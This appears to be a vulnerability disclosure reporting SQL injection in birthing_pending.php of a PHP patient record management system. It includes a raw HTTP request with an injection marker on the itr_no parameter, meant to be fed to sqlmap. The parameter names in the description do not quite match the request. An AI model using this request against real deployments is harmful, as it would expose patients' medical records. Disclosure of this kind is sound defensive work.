# patient-record-management-system-in-php has sql injection in birthing_pending.php

## supplier 

https://code-projects.org/patient-record-management-system-in-php-with-source-code/#google_vignette

## Vulnerability parameter

birthing_pending.php

## describe

An unrestricted SQL injection attack exists in patient-record-management-system-in-php in birthing_pending.php The parameters that can be controlled are as follows: $birth_id. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the value of $id parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/d57664a0-3c4c-4bd4-a23c-92ae28308bca)



## POC

run sqlmap.py 

```
GET /birthing_pending.php?itr_no=1* HTTP/1.1
Host: healthcarepatientrecordmanagementsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=apub8ggoc8777fmi1n9sbu6ca1
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

**Result**

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
